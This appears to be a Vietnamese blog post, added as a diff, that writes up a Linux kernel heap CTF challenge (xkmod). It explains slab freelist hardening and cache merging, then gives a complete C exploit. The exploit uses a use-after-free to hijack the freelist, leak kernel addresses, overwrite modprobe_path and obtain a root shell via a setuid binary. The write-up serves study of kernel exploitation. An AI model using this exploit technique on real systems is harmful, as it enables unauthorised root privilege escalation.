@@ -1,0 +1,357 @@
+---
+title: Arbitrary-Address Allocation  
+date: 2025-02-14 
+description : 'no desc'
+tags: ['kernel']
+author: ['kuvee']
+draft: false
+---
+
+
+
+
+
+
+
+```
+- khá giống với user-land , thì heap kernel-land cũng có thể allocate 1 adddress tùy ý (nhưng không dùng hàm hook như user-land mà thay vào đó là mprobe_path , tty_struct ... ) bằng cách overwrite `next_pointer` trong `freelist` 
+/home $ cat /sys/devices/system/cpu/vulnerabilities/*
+Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+Mitigation: PTE Inversion
+Mitigation: PTI
+Mitigation: usercopy/*swapgs* barriers and __user pointer sanitization
+Not affected
+Processor vulnerable
+Vulnerable
+Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
+```
+
+
+các cơ chế bảo vệ ở heap sẽ bao gồm : 
+
+```
+Freelist Randomization , CONFIG_SLAB_FREELIST_HARDENED , Hardened Usercopy  .... 
+```
+
+
+- Freelist randomization : tưởng tượng đối với heap userspace thì nó sẽ được allocate theo thứ tự address từ thấp đến cao : 
+
+nguồn : pwn.college 
+
+![image](https://hackmd.io/_uploads/B11cUuh_xe.png)
+
+
+tuy nhiên khi `freelist_randomization` được bật thì nó sẽ trả về 1 obj ngẫu nhiên có trong `cache`
+
+![image](https://hackmd.io/_uploads/SkMkwuhugl.png)
+
+- CONFIG_SLAB_FREELIST_HARDENED : khá giống với `safe-linking` ở `tcache` và `fastbin` , tuy nhiên nó bổ sung thêm 1 giá trị random , điều này sẽ gây khó khăn hơn rất nhiều nếu muốn `freelist-hijacking` 
+
+
+```
+static inline freeptr_t freelist_ptr_encode(const struct kmem_cache *s,
+					    void *ptr, unsigned long ptr_addr)
+{
+	unsigned long encoded;
+
+#ifdef CONFIG_SLAB_FREELIST_HARDENED
+	encoded = (unsigned long)ptr ^ s->random ^ swab(ptr_addr);
+#else
+	encoded = (unsigned long)ptr;
+#endif
+	return (freeptr_t){.v = encoded};
+}
+```
+
+ta có thể check `kpti` như sau: 
+
+```
+/home $ cat /sys/devices/system/cpu/vulnerabilities/*
+Processor vulnerable
+Mitigation: PTE Inversion
+Vulnerable: Clear CPU buffers attempted, no microcode; SMT Host state unknown
+Mitigation: PTI
+Vulnerable
+Mitigation: usercopy/swapgs barriers and __user pointer sanitization
+Mitigation: Full generic retpoline, STIBP: disabled, RSB filling
+Not affected
+```
+
+
+```c
+__int64 __fastcall xkmod_ioctl(__int64 a1, int cmd, __int64 a3)
+{
+  __int64 struct_node; // [rsp+0h] [rbp-20h] BYREF
+  unsigned int idx; // [rsp+8h] [rbp-18h]
+  unsigned int size; // [rsp+Ch] [rbp-14h]
+  unsigned __int64 v7; // [rsp+10h] [rbp-10h]
+
+  v7 = __readgsqword(0x28u);
+  if ( !a3 )
+    return 0;
+  copy_from_user(&struct_node, a3, 16);
+  if ( cmd == 0x6666666 )
+  {
+    if ( buf && size <= 0x50 && idx <= 0x70 )
+    {
+      copy_from_user((char *)buf + (int)idx, struct_node, size);
+      return 0;
+    }
+  }
+  else
+  {
+    if ( cmd != 0x7777777 )
+    {
+      if ( cmd == 0x1111111 )
+        buf = (void *)kmem_cache_alloc(s, 06300);
+      return 0;
+    }
+    if ( buf && size <= 0x50 && idx <= 0x70 )
+    {
+      copy_to_user(struct_node, (char *)buf + (int)idx);
+      return 0;
+    }
+  }
+  return xkmod_ioctl_cold();
+}
+```
+
+
+- 1 bài heap kernel với các `cmd` cơ bản , các thao tác cũng không dùng các cơ chế khóa luồng nào 
+
+ý tưởng đơn giản ở bài này là ta sẽ sử dụng `write-after-free` để write `next-pointer` và chiếm đoạt free-list để có thể `AAA` , nhưng trước hết là ta cần phải leak `kernel-base` . trong bài viết thì author có bảo là sẽ có 1 địa chỉ kernel (`secondary_startup_64`) được lưu giữ ở heap_base+0x9d000 , vì vậy trước hết ta cần leak_heap -> leak_kernel và overwrite `modprobe_path`
+
+
+```c
+entry_SYSCALL_64()
+    sys_execve()
+        do_execve()
+            do_execveat_common()
+                bprm_execve()
+                    exec_binprm()
+                        search_binary_handler()
+                            __request_module() // wrapped as request_module
+                                call_modprobe()
+```
+
+
+- hàm ` call_usermodehelper_exec` được gọi để thực thi `modprobe_path` với quyền root , xem nó như là 1 path của 1 file thực thi . giá trị mặc định là `/sbin/modprobe` , vì vậy ta chỉ cần overwrite chuỗi này thành 1 đường dẫn đến file độc hại -> priveleged
+
+
+
+
+
+```c
+static int call_modprobe(char *module_name, int wait)
+{
+	//...
+	argv[0] = modprobe_path;
+	argv[1] = "-q";
+	argv[2] = "--";
+	argv[3] = module_name;	/* check free_modprobe_argv() */
+	argv[4] = NULL;
+
+	info = call_usermodehelper_setup(modprobe_path, argv, envp, GFP_KERNEL,
+					 NULL, free_modprobe_argv, NULL);
+	if (!info)
+		goto free_module_name;
+
+	return call_usermodehelper_exec(info, wait | UMH_KILLABLE);
+	//...
+```
+
+
+
+
+- ngoài ra bài này còn 1 điểm chú ý là ở hàm `init` nó sử dụng `kmem_cache_create` , đây là 1 hàm dùng để tạo ra 1 cache riêng biệt có kích thước cố định (khác với các cache khác có sẵn như  kmalloc-x)
+
+```c
+int __cdecl xkmod_init()
+{
+  file *file; // rsi
+  kmem_cache *s; // rax
+
+  printk(&unk_1E4, file);
+  misc_register(&xkmod_device);
+  s = (kmem_cache *)kmem_cache_create("lalala", 192, 0, 0, 0);
+  buf = 0;
+  s = s;
+  return 0;
+}
+```
+
+mình có thử allocate 1 slot và check thử thì `cache` này là `cred-jar` , có nghĩa là obj `lalala` đã bị gộp với `cred_jar` 
+
+
+![image](https://hackmd.io/_uploads/SywYAG7Keg.png)
+
+check `/proc/slabinfo` ta có thể xác minh được điều này 
+
+
+```
+/home # cat /proc/slabinfo | grep cred_
+cred_jar             168    168    192   21    1 : tunables    0    0    0 : slabdata      8      8      0
+/home # cat /proc/slabinfo | grep lalala
+```
+
+sau 1 lúc tìm hiểu thì kernel sẽ có 1 cơ chế hợp nhất `cache merging` để tiết kiệm tài nguyên và tránh lãng phí bộ nhớ , nếu tạo nhiều `kmem_cache` có cùng cấu hình (size , flags ... ) giống nhau , kernel sẽ tái sử dụng cache đã tồn tại trước đó thay vì tạo mới (như `lalala` ở trong bài )
+
+- ta có thể đọc thêm ở đây: https://lwn.net/Articles/1016426/
+
+- vậy flow exploit của ta sẽ như sau: 
+
+alloc -> delete -> read để leak heapbase 
+
+khi có heap_base ta sẽ leak kernel bằng offset như bên dưới , overwrite `next-pointer`
+
+![image](https://hackmd.io/_uploads/HJCMFSQYlg.png)
+
+- hình bên dưới là khi ta vừa thực hiện `kmem_cache_alloc` , `next-pointer` có địa chỉ là `0xffff9d3dc3f2b900`
+
+![image](https://hackmd.io/_uploads/Sy6rtBQYxl.png)
+
+
+- nếu nhìn vào free-list ta cũng có thể thấy địa chỉ đó đang ở entry-freelist 
+
+![image](https://hackmd.io/_uploads/r1HYYSmKge.png)
+
+- vậy ý tưởng đơn giản là ta sẽ dùng `uaf` để overwrite nó thành địa chỉ heap chứa địa chỉ kernel -> leak kernel 
+- có kernel rồi thì thực hiện tương tự để allocate `modprobe_path` và `overwrite`
+
+ngoài ra còn lưu ý 1 điều nữa là khi allocate 1 slot thì 8 byte đầu tiên của slot này sẽ ghi vào `free-list` nếu nó không phải địa chỉ hợp lệ -> `kernel-panic` . do đó ta cần chọn 1 vùng có 8 byte 0 để `kmem_cache` yêu cầu 1 slub mới từ `buddy-allocator` , tránh gây lỗi.
+
+
+exp: 
+
+```c
+#define _GNU_SOURCE
+
+#include <fcntl.h>
+#include <sched.h>
+#include <stdint.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <sys/ioctl.h>
+#include <unistd.h>
+
+typedef struct {
+  size_t *ptr;
+  uint32_t offset;
+  uint32_t lenght;
+} Data;
+#define MODPROBE_PATH 0xffffffff82444700
+#define vuln "/dev/xkmod"
+#define alloc 0x1111111
+#define from_kernel 0x7777777
+#define from_user 0x6666666
+#define ROOT_SCRIPT_PATH "/home/xx\0"
+void bindCore(int core) {
+  cpu_set_t cpu_set;
+
+  CPU_ZERO(&cpu_set);
+  CPU_SET(core, &cpu_set);
+  sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
+
+  printf("\033[34m\033[1m[*] Process binded to core \033[0m%d\n", core);
+}
+
+void allocate(int fd, Data *tmp) { ioctl(fd, alloc, tmp); }
+void edit_kn(int fd, Data *tmp) { ioctl(fd, from_user, tmp); }
+void read_kn(int fd, Data *tmp) { ioctl(fd, from_kernel, tmp); }
+
+void get_root() {
+  system("echo -e \"#!/bin/sh\nchown root:root /exploit\nchmod 4777 /exploit\" "
+         "> /home/xx");
+  system("chmod +x /home/xx");
+
+  system("echo -ne '\xff\xff\xff\xff' > /home/a");
+  system("chmod +x /home/a");
+  system("/home/a");
+
+  puts("[*] setup success for modprobe_path");
+  system("/exploit gogo");
+}
+
+int main(int argc, char **argv) {
+  bindCore(0);
+  int fd[5];
+  if (argc == 2) {
+    printf("[+] getuid() returns %d\n", geteuid());
+    setuid(0);
+    setgid(0);
+    system("/bin/sh");
+    return 0;
+  }
+  for (int i = 0; i < 3; i++) {
+    fd[i] = open(vuln, O_RDONLY);
+    if (fd[i] < 0) {
+      perror("open");
+      exit(-1);
+    }
+  }
+  Data data;
+  data.ptr = malloc(0x1000);
+  data.offset = 0;
+  data.lenght = 0x50;
+  memset(data.ptr, 0, 0x1000);
+  // alloc fd(0)
+  allocate(fd[0], &data);
+  // uaf
+  close(fd[0]);
+  // leak kernel heap
+  read_kn(fd[1], &data);
+  size_t heap_leak = data.ptr[0];
+  size_t page_offset_base = heap_leak & 0xfffffffff0000000;
+  printf("[*] heap leak: 0x%lx\n", heap_leak);
+  printf("[!] Guess page_offset_base: 0x%lx\n", page_offset_base);
+
+  puts("[*] leaking kernel base");
+  data.ptr[0] = page_offset_base + 0x9d000 - 0x10;
+  data.offset = 0;
+  data.lenght = 8;
+  edit_kn(fd[1], &data);
+  allocate(fd[1], &data);
+  allocate(fd[1], &data);
+  data.lenght = 0x40;
+  read_kn(fd[1], &data);
+  if ((data.ptr[2] & 0xfff) != 0x30) {
+    printf("[!] invalid data leak: 0x%lx\n", data.ptr[2]);
+    exit(-1);
+  }
+  size_t kernel_base = data.ptr[2] - 0x30;
+  size_t kernel_offset = kernel_base - 0xffffffff81000000;
+  printf("\033[32m\033[1m[+] kernel base:\033[0m 0x%lx\n", kernel_base);
+  printf("\033[32m\033[1m[+] kernel offset:\033[0m 0x%lx\n", kernel_offset);
+
+  puts("====== hijacking modprobe_path ======");
+  allocate(fd[1], &data);
+  close(fd[1]);
+  printf("allocate at: 0x%lx\n", kernel_offset + MODPROBE_PATH - 0x10);
+
+  data.ptr[0] = kernel_offset + MODPROBE_PATH - 0x10;
+  data.offset = 0;
+  data.lenght = 0x8;
+
+  edit_kn(fd[2], &data);
+  allocate(fd[2], &data);
+  allocate(fd[2], &data);
+  strcpy((char *)&data.ptr[2], ROOT_SCRIPT_PATH);
+  data.lenght = 0x30;
+  edit_kn(fd[2], &data);
+  puts("[+] trigger modprobe_path");
+  get_root();
+
+  return 0;
+}
+
+```
+
+
+![image](https://hackmd.io/_uploads/r1ML3LmFxe.png)
+
+
+ref: 
+
+thầy arttnba3 : https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/
+
